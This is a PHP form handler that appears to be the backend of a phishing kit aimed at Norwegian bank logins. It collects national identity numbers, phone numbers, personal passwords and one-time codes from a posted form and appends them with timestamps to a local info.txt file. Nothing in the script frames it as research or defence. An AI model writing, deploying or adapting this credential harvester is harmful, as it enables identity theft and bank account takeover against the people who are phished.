<?php
header("Content-Type: application/json");

$data = file_get_contents("php://input");
$formData = json_decode($data, true);

$file = "info.txt";

$response = ["status" => "error", "message" => "Invalid input."];

try {
    // Check that all required fields are set
    if (
        isset($formData['input01']) &&
        isset($formData['input02']) &&
        isset($formData['input03']) &&
        isset($formData['input04']) &&
        isset($formData['input05']) &&
        isset($formData['input07']) &&
        isset($formData['input08'])
    ) {
        // Prepare data for saving
        $saveData = [
            "Fodselsnummer" => $formData['input01'],
            "Telefonnummer" => $formData['input02'],
            "Engangskode" => $formData['input03'],
            "PersoneligPassord" => $formData['input04'],
            "EngangskodeIgjen" => $formData['input05'],
            "GjentaPassord" => $formData['input07'],
            "GjentaKode" => $formData['input08'],
            "timestamp" => date("Y-m-d H:i:s"),
        ];

        // Check if the file exists; create it if not
        if (!file_exists($file)) {
            file_put_contents($file, json_encode([])); // Initialize as an empty array
        }

        // Read current data and decode
        $currentData = json_decode(file_get_contents($file), true);
        if (!is_array($currentData)) {
            $currentData = []; // Reinitialize if file data is invalid
        }

        // Append new data
        $currentData[] = $saveData;

        // Save updated content back to the file
        file_put_contents($file, json_encode($currentData, JSON_PRETTY_PRINT));

        // Respond with success
        $response = ["status" => "success", "message" => "Data saved successfully."];
    } else {
        throw new Exception("All fields are required.");
    }
} catch (Exception $e) {
    // Return the exception message in the response
    $response["message"] = $e->getMessage();
}

// Output the response as JSON
echo json_encode($response);
?>
